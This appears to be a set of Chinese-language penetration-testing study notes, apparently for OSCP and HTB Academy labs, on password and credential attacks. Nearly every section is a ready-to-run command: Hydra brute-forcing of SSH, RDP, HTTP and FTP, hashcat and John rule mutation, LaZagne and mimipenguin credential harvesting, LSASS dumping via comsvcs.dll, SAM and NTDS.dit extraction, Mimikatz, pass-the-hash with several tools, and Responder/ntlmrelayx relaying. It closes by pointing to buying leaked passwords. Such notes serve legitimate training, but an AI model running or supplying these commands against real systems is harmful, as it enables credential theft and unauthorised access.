>[!NOTE]
>有攻擊服務、密碼爆破、尋找密碼、字典檔變形
# 攻擊網路服務
>[!WARNING]
>利用Hydra、crackmapexec
## Hydra 
* Hydra攻擊ssh
```
sudo hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
```
* Hydra攻擊rdp
```
sudo hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
```
* Hydra攻擊 http post
```
sudo hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```
```
sudo hydra -L custom-wordlist.list -P custom-wordlist.list 192.168.243.61 -s 8081 http-post-form "/service/rapture/session:username=^USER64^&password=^PASS64^:F=403" -f  -I -vV
```
```
hydra -I -f -L custom-wordlist.txt -P custom-wordlist.txt 'http-post-form://192.168.233.61:8081/service/rapture/session:username=^USER64^&password=^PASS64^:C=/:F=403'
```
```
hydra 10.11.1.250 -t 2 -l admin -P /usr/share/wordlists/rockyou.txt http-form-get "/dvwa/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=low;PHPSESSID=409e45633a8281adb8f182021cfacd14"
```
* Hydra攻擊 http get
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.190.201 http-get -f -V
```
- Hydra攻擊FTP
```
hydra -c /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 10.10.10.1 ftp 
```
# 幫字典檔形變
>[!WARNING]
>利用Hydra、JohnTheRapper
## Hydra相關
>[!WARNING]
>hashcat 相關應用

### Hydra爆破時套用變形檔
```
hashcat -m 0 hash.txt password.list -r rule_demo.rule --force
```
### 利用Hydra製作變形檔
```
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```

## JohntheRapper
>[!WARNING]
>hashcat 相關應用
### John爆破時套用變形檔
```
sudo john --wordlist=password.list ssh.hash --rules=sshRules
```
### John編寫變形檔
```
[List.Rules:sshRules] 
c $1 $3 $7 $! 
c $1 $3 $7 $@ 
c $1 $3 $7 $#
```
```
sudo sh -c 'cat /home/kali/Desktop/OSCP/ssh.rule >> /etc/john/john.conf'
```
# SSH Private Key 破解
```
ssh2john id_rsa > ssh.hash
```
```
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
```
# Credential Hunting Tools
>[!WARNING]
>來自HTB Academy 的資料，內容包刮Linux、Windows、Browser的相關密碼取得方法

>[!WARNING]
>再Linux及Windows提權那邊也會有相關內容 

## Linux
[https://github.com/huntergregal/mimipenguin](https://github.com/huntergregal/mimipenguin)
```
sudo python3 mimipenguin.py
```
```
sudo python2.7 laZagne.py all
```
## Windows 
[https://github.com/AlessandroZ/LaZagne/releases/](https://github.com/AlessandroZ/LaZagne/releases/)
```
start lazagne.exe all
```
## Browsers
- 手動搜尋
```
cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
```
```
python3.9 firefox_decrypt.py
```
- 自動搜尋
```
python3 laZagne.py browsers
```

# NTLM相關手法
>[!NOTE]
>NTLM主要是Windows密碼相關的東西，NTLM的各種攻擊手法幾乎都需要使用到最高權限。

## Attacking LSASS
>本機安全認證子系統服務（Local Security Authority Subsystem Service，縮寫 LSASS），是微軟視窗作業系統的一個內部程式，負責執行Windows系統安全政策。它在使用者登入時電腦單機或伺服器時，驗證使用者身分，管理使用者密碼變更，並產生存取字元。它也會在視窗安全記錄檔中留下應有的記錄。
### 用PS找LSAAS的ID
```
Get-Process lsass
```
### 用rundll32 Dump LSAAS
```
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```
### Pypykatz解析出密碼
```
pypykatz lsa minidump /home/peter/Documents/lsass.dmp
```
## Volume Shadow Copy Service
>透過磁碟輩分手段撈資料，可以產出NTDS.dit

- 建立備份
```
vssadmin CREATE SHADOW /For=C:
```
- 從shadow裡免撈出NTDS.dit
```
C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```
## 用reg.exe撈出Windows密碼
- 撈密碼
```
reg.exe save hklm\sam C:\sam.save 
reg.exe save hklm\system C:\system.save 
reg.exe save hklm\security C:\security.save
```
*  解析帳號密碼
```
secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

## 用Mimikatz撈出密碼及hash

- 作業前要先提權
```
privilege::debug
```
### Mimikatz撈密碼指令
* 撈明碼以及hash
```
sekurlsa::logonpasswords
```
- 撈SAM的NTLM hash
```
lsadump::sam
```
- 提到最高權限
```
token::elevate
```
## PassTheHash
>當拿到NTLM hash其實就可以打進去了，不需要真的拿到密碼

### smbclient
```
smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
```
### impacket-psexec
```
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
```
### xfreerdp
```
xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```
### evil-winrm
```
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```
### crackmapexec
```
crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```
### impacket-wmiexec
```
impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
```

*  開啟RDP的Pth功能
```
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

## Net-NTLMv2相關
>[!NOTE]
>當拿到Low-Level Shell的時候，無法使用minikatz，但是可以透過Net-NTLMv2拿 hash，原理是利用smb存取kali的臨時伺服器來拿到Net-NTLMv2 hash。

>[!NOTE]
>Net-NTLM是不可以用Pass The Hash的，但是可以用Ntlm Relay Attack去打其他台相同帳號的主機。
### 攻擊步驟
1. Kali : 開設responder
```
sudo responder -I tun0
```
2. Target PC : 直接存取smb
```
dir \\kali ip address\test
```
3. 用hashcat破解
```
hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
```
### impacket-ntlmrelayx
>可以直接把respond反彈到其他主機，-t就是要反彈的主機
```
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.203.212 -c "command"
```
# Password Manager
```
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```
```
keepass2john Database.kdbx > keepass.hash
```

# 直接買外流密碼
- dehashed : https://dehashed.com/